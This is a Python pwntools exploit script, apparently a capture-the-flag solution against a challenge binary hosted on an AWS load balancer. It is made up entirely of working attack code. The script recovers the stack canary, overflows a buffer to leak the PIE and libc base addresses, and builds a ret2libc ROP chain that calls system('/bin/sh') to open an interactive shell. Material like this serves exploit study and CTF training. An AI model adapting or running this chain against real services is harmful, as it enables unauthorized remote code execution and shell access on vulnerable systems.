from pwn import *
from base64 import b64decode

if sys.argv[1] == "local":
    io = process("./chall",aslr=True)
    libc = ELF("./libc6_2.36-0ubuntu2_amd64.so")
    canary = 0x5199991bd1359f1f

elif sys.argv[1] == "remote":
    io = remote("hto2024-nlb-fa01ec5dc40a5322.elb.ap-northeast-2.amazonaws.com",5001)
    libc = ELF("./libc6_2.36-9+deb12u4_amd64.so")
    io.recvline()
    io.recvline()
    
    b64_binary = io.recvline()[:-1]
    binary = b64decode(b64_binary)
    canary = u64(binary[12336:12344])

rop = ROP(libc)
log.info("CANARY: " + hex(canary))

# leak PIE and restart the binary
io.sendafter(b"input>",b"A"*0x208 + p64(canary) + b"A"*8 + b"\xf2")
io.recvuntil(p64(canary))
io.recvuntil(b"AAAAAAAA")
pieBase = u64(io.recv(6).ljust(8,b"\x00")) - 0x3f2
log.info("PIE BASE: " + hex(pieBase))

# leak libc and restart binary
printfPlt = p64(pieBase+0xc0)
vuln = p64(pieBase+0x324)
ret = p64(pieBase+0x3fd)

exploit = b"A"*0x208 + p64(canary) + b"B"+b"\x00"*7 + ret + printfPlt + ret + vuln
io.sendafter(b"input>",exploit)

io.recvuntil(b"B")
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["funlockfile"]
log.info("LIBC BASE: " + hex(libc.address))

# ret2libc
popRdi = p64(libc.address + rop.rdi[0])
ret2libc = b"A"*0x208 + p64(canary) + b"\x00"*8 + ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"]) 
#gdb.attach(io,gdbscript="break *" + hex(pieBase+0x3e4))
io.sendafter(b"input>",ret2libc)
 
io.interactive()
